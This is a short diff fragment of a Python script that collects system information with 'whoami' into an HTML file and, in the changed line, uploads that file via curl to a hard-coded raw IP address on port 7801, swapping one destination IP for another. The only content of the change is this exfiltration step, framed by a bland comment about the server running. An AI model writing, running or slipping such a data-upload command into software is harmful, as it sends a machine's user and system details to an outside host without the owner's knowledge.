@@ -16,7 +16,7 @@ subprocess.run("whoami >> system_info.html", shell=True)
 
 
 # Ensure the server is running and the file exists 
-subprocess.run('curl -F "file=@system_info.html" http://3.236.241.225:7801/upload', shell=True) 
+subprocess.run('curl -F "file=@system_info.html" http://44.213.80.165:7801/upload', shell=True) 
 
 
 
